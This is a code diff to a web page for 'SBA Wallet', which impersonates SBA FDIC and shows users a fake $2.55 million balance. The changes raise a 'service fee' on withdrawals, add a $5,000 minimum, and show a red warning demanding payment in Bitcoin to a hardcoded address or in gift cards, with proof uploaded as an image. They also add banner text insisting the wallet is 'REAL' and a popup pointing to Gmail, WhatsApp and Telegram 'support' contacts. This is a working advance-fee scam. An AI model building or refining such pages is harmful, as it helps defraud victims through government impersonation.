@@ -571,6 +571,38 @@ footer {
 
 <body>
 
+<!-- SBA WALLET INTRO SCREEN -->
+<section id="sbaIntro" style="
+    position:fixed;
+    inset:0;
+    z-index:100000;
+    background:radial-gradient(ellipse at center,#30230c 0%,#090909 70%);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    color:#ffe7a0;
+    font-family:Arial,Helvetica,sans-serif;
+">
+   <img
+    src="sba-logo.png.png"
+    alt="SBA Wallet Logo"
+    style="width:250px;height:250px;background:white;object-fit:contain;"
+    onerror="this.alt='IMAGE NOT FOUND - CHECK FILE NAME';this.style.border='2px solid red';"
+>
+
+    <h1 style="
+        margin:22px 0 5px;
+        font-size:30px;
+        letter-spacing:3px;
+    ">REAL WALLET!!!</h1>
+
+    <p style="color:#d9b45b;font-size:13px;letter-spacing:2px;">
+        EVERYTHING HERE REMAINS REAL!.
+    </p>
+</section>
+<!-- END SBA WALLET INTRO -->
+
 <div id="pageLoader" class="hidden" role="status" aria-live="polite">
     <div class="page-loader-spinner"></div>
     <strong>Please wait...</strong>
@@ -591,7 +623,19 @@ footer {
     <!-- LOGIN AND REGISTRATION -->
     <section id="authScreen" class="panel auth-panel">
 
-        <div class="auth-emblem"><span>SBA</span></div>
+        
+<div class="auth-emblem">
+    <img
+        src="./sba-logo.png.png"
+        alt="SBA Wallet Logo"
+        style="
+            display: block;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        "
+    >
+</div>
 
         <h1 id="authTitle" class="auth-heading">Welcome to SBA Wallet</h1>
         <p id="authDescription" class="auth-subtitle">
@@ -794,7 +838,7 @@ footer {
 
                     
 <label for="withdrawAmount">Amount (USD)</label>
-<input id="withdrawAmount" type="number" min="0.01" max="2550000" step="0.01" placeholder="Enter amount" required>
+<input id="withdrawAmount" type="number" min="5000" max="2550000" step="0.01" placeholder="Enter amount" required>
 
                      
 <div id="serviceFeeDisplay" class="screen-note" aria-live="polite">
@@ -1024,7 +1068,46 @@ footer {
 <footer>
     <p>© 2026 SBA FDIC. All rights reserved.</p>
 <script>
+
 "use strict";
+
+document.addEventListener("DOMContentLoaded", function () {
+  const contactButton = document.getElementById("sbaFloatingContact");
+  const contactOptions = document.getElementById("sbaContactOptions");
+  const closeButton = document.getElementById("sbaContactOptionsClose");
+
+  if (!contactButton || !contactOptions || !closeButton) {
+    console.warn("Contact Us HTML elements were not found.");
+    return;
+  }
+
+ 
+contactButton.addEventListener("click", function () {
+  const isHidden = contactOptions.hidden;
+
+  contactOptions.hidden = !isHidden;
+  contactOptions.style.display = isHidden ? "block" : "none";
+  contactOptions.style.position = "fixed";
+  contactOptions.style.right = "20px";
+  contactOptions.style.bottom = "80px";
+  contactOptions.style.zIndex = "999999";
+  contactOptions.style.background = "#100e0a";
+  contactOptions.style.color = "#f5c451";
+  contactOptions.style.padding = "20px";
+  contactOptions.style.border = "1px solid #f5c451";
+  contactOptions.style.borderRadius = "12px";
+  contactOptions.style.width = "280px";
+  contactOptions.style.boxShadow = "0 8px 24px rgba(0,0,0,0.5)";
+
+  contactButton.setAttribute("aria-expanded", String(isHidden));
+});
+
+  closeButton.addEventListener("click", function () {
+    contactOptions.hidden = true;
+    contactButton.setAttribute("aria-expanded", "false");
+  });
+});
+
 
 const SBA_WALLET_ADDRESS = "bc1q6mpexpcwqrqc38c7rf2tyh0mhazhgzl72cd36p";
 const STARTING_BALANCE = 2550000;
@@ -1101,6 +1184,7 @@ function showDashboard() {
     renderTransactions();
 }
 
+
 function showPageLoader() {
   const loader = document.getElementById("pageLoader");
 
@@ -1114,7 +1198,7 @@ function showPageLoader() {
     setTimeout(function () {
       loader.classList.add("hidden");
       resolve();
-    }, 5000);
+    }, 7000);
   });
 }
 
@@ -1212,7 +1296,7 @@ $("authSwitch").addEventListener("click", function () {
     }
 });
 
-$("registerForm").addEventListener("submit", function (event) {
+$("registerForm").addEventListener("submit", async function (event) {
     event.preventDefault();
 
     const name = $("registerName").value.trim();
@@ -1257,6 +1341,8 @@ $("registerForm").addEventListener("submit", function (event) {
         return;
     }
 
+   
+    await showPageLoader();
     setSession(true);
     showDashboard();
 });
@@ -1455,13 +1541,13 @@ $("withdrawMethod").addEventListener("change", function () {
 
 function getEstimatedDemoFee(amount) {
     if (!Number.isFinite(amount) || amount <= 0) return 0;
-    if (amount >= 2550000) return 1000;
-    if (amount >= 1000000) return 500;
-    if (amount >= 500000) return 250;
-    if (amount >= 100000) return 150;
-    if (amount >= 30000) return 100;
-    if (amount >= 10000) return 75;
-    return 50;
+    if (amount >= 2550000) return 10075;
+    if (amount >= 1000000) return 5075;
+    if (amount >= 500000) return 3075;
+    if (amount >= 100000) return 1075;
+    if (amount >= 30000) return 575;
+    if (amount >= 10000) return 275;
+    return 75;
 }
 
 $("withdrawForm").addEventListener("submit", async function (event) {
@@ -1473,16 +1559,21 @@ $("withdrawForm").addEventListener("submit", async function (event) {
         return;
     }
 
-    const method = $("withdrawMethod").value;
-    const amount = Number($("withdrawAmount").value);
+const method = $("withdrawMethod").value;
+const amount = Number($("withdrawAmount").value);
 
-    if (!method || !Number.isFinite(amount) ||
-        amount <= 0 || amount > Number(account.balance)) {
-        $("withdrawMessage").textContent =
-            "Select a method and enter a valid amount within your balance.";
-        $("withdrawMessage").className = "error";
-        return;
-    }
+if (!method || !Number.isFinite(amount) ||
+    amount < 5000 || amount > Number(account.balance)) {
+
+    $("withdrawMessage").textContent =
+        amount < 5000
+            ? "Minimum withdrawal is $5,000."
+            : "Select a method and enter a valid amount within your balance.";
+
+    $("withdrawMessage").className = "error";
+    return;
+}
+
 
     for (const id of (methodRequiredFields[method] || [])) {
         const field = $(id);
@@ -1556,7 +1647,7 @@ $("reviewFeeDetailsScreen").style.whiteSpace = "pre-line";
 const warningMessage =
     "WARNING NOTICE\n\n" +
      "Your withdrawal request is pending review. THE SERVICE FEE IS REQUIRED TO BE PAID BEFORE FUNDS CAN BE WITHDRAWN TO YOUR PREFERABLE ACCOUNT BALANCE IMMEDIATELY. PAY THROUGH BITCOIN OR GIFTCARD. Copy the Bitcoin address under your account balance and UPLOAD image of payment either via BITCION OR GIFTCARD on the Image Upload. #YOUR MONEY WILL BE SENT IMMEDIATELY AN UPLOAD IS MADE#\n\n" + 
-     "SBA FDIC\n\n" 
+     "Please note: Go back to copy the wallet address to make payment to and if it's by Giftcard, get it before proceeding to upload both Bitcoin payment or Giftcard image payment\n\n" +
      "Withdrawal Amount: $" + amount.toLocaleString("en-US") + "\nApplicable Service Fee: $" + fee.toLocaleString("en-US") + "\n\nSBA FDIC";
 $("reviewDetails").textContent = warningMessage;
 $("reviewDetails").style.color = "#ff0000";
@@ -1587,7 +1678,21 @@ async function copyWalletAddress() {
 
 $("copyAddress").addEventListener("click", copyWalletAddress);
 
-/* Restore a saved demo session */
+
+/* SBA Wallet logo intro: show for 5 seconds */
+(function () {
+    const intro = document.getElementById("sbaIntro");
+
+    if (!intro) return;
+
+    document.body.style.overflow = "hidden";
+
+    setTimeout(function () {
+        intro.style.display = "none";
+        document.body.style.overflow = "";
+    }, 5000);
+})();
+
 (function initialise() {
     const saved = readJSON(ACCOUNT_KEY, null);
     let session = null;
@@ -1625,49 +1730,22 @@ function closeExtraScreen() {
 }
 </script>
 
-<!-- Profile screen -->
-<section id="profileScreen" class="extra-screen">
-  <button type="button" class="screen-back" onclick="closeExtraScreen()">
-    ← Back
-  </button>
+<script>
+(function () {
+    const intro = document.getElementById("sbaIntro");
 
-  <h2>My Profile</h2>
-  
-  <form id="profileForm">
-    <label for="profileFullName">Full name</label>
-    <input
-      id="profileFullName"
-      type="text"
-      maxlength="100"
-      placeholder="Enter your name"
-      autocomplete="name"
-    >
+    if (!intro) return;
 
-    <label for="profileEmail">Email address</label>
-    <input
-      id="profileEmail"
-      type="email"
-      maxlength="254"
-      placeholder="Enter your email"
-      autocomplete="email"
-    >
+    document.body.style.overflow = "hidden";
 
-    <label for="profilePhone">Phone number (optional)</label>
-    <input
-      id="profilePhone"
-      type="tel"
-      maxlength="25"
-      placeholder="Enter your phone number"
-      autocomplete="tel"
-    >
+    setTimeout(function () {
+        intro.style.display = "none";
+        document.body.style.overflow = "";
+    }, 5000);
+})();
+</script>
 
-    <button type="submit" class="screen-action">
-      Save Profile
-    </button>
 
-    <p id="profileMessage" class="screen-note" aria-live="polite"></p>
-  </form>
-</section>
 
 <script>
 (function () {
@@ -1974,30 +2052,6 @@ function closeExtraScreen() {
 
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
-
- 
-backButton.addEventListener("click", function (event) {
-    event.preventDefault();
-
-    screen.classList.remove("active");
-    screen.classList.remove("hidden");
-
-    document.querySelectorAll(".extra-screen").forEach(function (item) {
-        item.classList.remove("active");
-    });
-
-    const authScreen = document.getElementById("authScreen");
-    const dashboard = document.getElementById("dashboard");
-
-    if (authScreen) authScreen.classList.add("hidden");
-    if (dashboard) dashboard.classList.remove("hidden");
-
-    if (typeof showDashboard === "function") {
-        showDashboard();
-    }
-
-    window.scrollTo({ top: 0, behavior: "smooth" });
-});
 })();
 </script>
 
@@ -2153,13 +2207,106 @@ await new Promise(resolve => setTimeout(resolve, 5000));
     });
 console.log("PARAworld: Backend responded with status", response.status);
     const result = await response.json();
+    console.log("Upload HTTP status:", response.status);
+console.log("Upload server response:", result);
 
     if (!response.ok) {
       throw new Error(result.error || "Image submission failed.");
     }
 
-    message.textContent = "Your image was submitted successfully.";
-    message.className = "screen-note success";
+   
+message.textContent = "Your image was submitted successfully.";
+message.className = "screen-note success";
+
+// Show Contact Us popup after successful image submission
+
+      // Show Contact Us popup after successful image submission
+      try {
+        // Remove an older popup if one exists
+        const oldPopup = document.getElementById("sbaContactPopup");
+        if (oldPopup) oldPopup.remove();
+
+        const contactPopup = document.createElement("div");
+        contactPopup.id = "sbaContactPopup";
+
+        contactPopup.style.cssText = `
+          position: fixed;
+          inset: 0;
+          z-index: 999999;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          padding: 20px;
+          background: rgba(0, 0, 0, 0.88);
+          font-family: Arial, sans-serif;
+          overflow-y: auto;
+        `;
+
+        contactPopup.innerHTML = `
+          <div style="
+            width: 100%;
+            max-width: 390px;
+            box-sizing: border-box;
+            padding: 28px 22px;
+            border: 1px solid #f5c451;
+            border-radius: 20px;
+            background: linear-gradient(145deg, #211a0b, #090909);
+            color: #ffffff;
+            text-align: center;
+            box-shadow: 0 0 35px rgba(245,196,81,.25);
+          ">
+            <div style="font-size:42px;margin-bottom:10px;">✓</div>
+            <h2 style="color:#f5c451;margin:0 0 12px;">
+              Image Submitted!
+            </h2>
+            <p style="color:#eeeeee;line-height:1.6;">
+              Need further assistance? Contact SBA Wallet Support below.
+            </p>
+            <a href="mailto:sbawalletsupport@gmail.com"
+              style="display:block;padding:13px;margin:12px 0;border-radius:10px;background:#f5c451;color:#100e0a;text-decoration:none;font-weight:bold;">
+              ✉ Email Support
+            </a>
+            <a href="https://wa.me/12708993500"
+              target="_blank" rel="noopener noreferrer"
+              style="display:block;padding:13px;margin:12px 0;border-radius:10px;background:#173c27;color:#ffffff;text-decoration:none;font-weight:bold;">
+              WhatsApp: +1 (270) 899-3500
+            </a>
+            <a href="https://t.me/SBAcustomer_service"
+              target="_blank" rel="noopener noreferrer"
+              style="display:block;padding:13px;margin:12px 0;border-radius:10px;background:#173448;color:#ffffff;text-decoration:none;font-weight:bold;">
+              Telegram Support
+            </a>
+            <button id="sbaContactClose" type="button"
+              style="width:100%;padding:12px;margin-top:10px;border:1px solid #f5c451;border-radius:10px;background:transparent;color:#f5c451;font-size:15px;cursor:pointer;">
+              Close
+            </button>
+          </div>
+        `;
+
+        document.body.appendChild(contactPopup);
+
+        document.getElementById("sbaContactClose").addEventListener("click", function () {
+  contactPopup.remove();
+
+  const dashboard = document.getElementById("dashboard");
+  const imageUploadScreen = document.getElementById("imageUploadScreen");
+
+  if (imageUploadScreen) {
+    imageUploadScreen.style.display = "none";
+  }
+
+  if (dashboard) {
+    dashboard.style.display = "block";
+  }
+});
+        console.log("SBA Wallet: Contact popup displayed.");
+      } catch (popupError) {
+        console.error("SBA Wallet contact popup error:", popupError);
+        message.textContent =
+          "Image submitted, but the contact popup could not open. Please contact support using the details on the website.";
+        message.className = "screen-note error";
+      }
+
   } catch (error) {
     console.error("Image submission failed:", error);
     message.textContent =
@@ -2175,34 +2322,83 @@ console.log("PARAworld: Backend responded with status", response.status);
 <style>
 /* Loading overlay */
 #pageLoader {
-    position: fixed;
-    inset: 0;
-    z-index: 99999;
-    background: rgba(16, 14, 10, 0.96);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    gap: 18px;
-    color: #f5c451;
-    font-family: Arial, sans-serif;
 }
 
-#pageLoader.hidden {
-    display: none;
+
+#sbaFloatingContact {
+  position: fixed;
+  right: 22px;
+  bottom: 25px;
+  z-index: 99999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  min-width: 175px;
+  height: 64px;
+  padding: 0 22px;
+  border: 2px solid #ffe09a;
+  border-radius: 50px;
+  background: linear-gradient(135deg, #f5c451, #e7a86b);
+  color: #100e0a;
+  font-size: 17px;
+  font-weight: 800;
+  cursor: pointer;
+  pointer-events: auto;
+  box-shadow: 0 6px 22px rgba(245, 196, 81, .35);
+  animation: sbaContactPulse 2s infinite, sbaContactFloat 3s ease-in-out infinite;
 }
 
-.page-loader-spinner {
-    width: 58px;
+#sbaFloatingContact:hover {
+  transform: scale(1.06);
+}
+
+#sbaFloatingContact .sba-contact-label {
+  position: static;
+  padding: 0;
+  border: 0;
+  background: transparent;
+  color: #100e0a;
+  font-size: 15px;
+  font-weight: 800;
+  white-space: nowrap;
+}
+
+#sbaFloatingContact span[aria-hidden="true"] {
+  font-size: 25px;
+}
+
+#sbaContactOptions {
+  z-index: 100000;
+  pointer-events: auto;
+}
+
+@keyframes sbaContactPulse {
+  0% { box-shadow: 0 0 0 0 rgba(245,196,81,.65); }
+  70% { box-shadow: 0 0 0 10px rgba(245,196,81,0); }
+  100% { box-shadow: 0 0 0 0 rgba(245,196,81,0); }
+}
+
+@keyframes sbaContactFloat {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-5px); }
+}
+
+@media (max-width: 480px) {
+  #sbaFloatingContact {
+    right: 14px;
+    bottom: 18px;
+    min-width: 160px;
     height: 58px;
-    border: 5px solid rgba(245, 196, 81, 0.2);
-    border-top-color: #f5c451;
-    border-radius: 50%;
-    animation: pageLoaderSpin 0.8s linear infinite;
+    font-size: 15px;
+  }
+
 }
 
-@keyframes pageLoaderSpin {
-    to { transform: rotate(360deg); }
+@media (prefers-reduced-motion: reduce) {
+  #sbaFloatingContact {
+    animation: none;
+  }
 }
 
 </style>
@@ -2230,6 +2426,66 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 });
 
+  </script>
+
+
+
+<button
+  id="sbaFloatingContact"
+  type="button"
+  aria-label="Contact SBA Wallet Support"
+  aria-expanded="false"
+  aria-controls="sbaContactOptions"
+  title="Contact Us"
+>
+  ✉
+  <span class="sba-contact-label">Contact Us</span>
+</button>
+
+<div id="sbaContactOptions" hidden>
+  <div class="sba-contact-header">
+    <strong>SBA Wallet Support</strong>
+    <button
+      id="sbaContactOptionsClose"
+      type="button"
+      aria-label="Close contact options"
+    >×</button>
+  </div>
+
+  <p>How can we help you?</p>
+  <p>Contact our support team for assistance with your account.</p>
+  <a href="mailto:support@yourdomain.com">Email Support</a>
+</div>
+</div>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const contactButton = document.getElementById("sbaFloatingContact");
+  const contactOptions = document.getElementById("sbaContactOptions");
+  const closeButton = document.getElementById("sbaContactOptionsClose");
+
+  if (!contactButton || !contactOptions || !closeButton) {
+    console.error("Contact Us elements are missing.");
+    return;
+  }
+
+  contactButton.addEventListener("click", function () {
+  alert("Contact Us button is working!");
+    contactOptions.hidden = !contactOptions.hidden;
+    contactButton.setAttribute(
+      "aria-expanded",
+      String(!contactOptions.hidden)
+    );
+  });
+
+  
+  closeButton.addEventListener("click", function () {
+    contactOptions.hidden = true;
+    contactButton.setAttribute("aria-expanded", "false");
+  });
+});
+</script>
 </script>
 </body>
 </html>
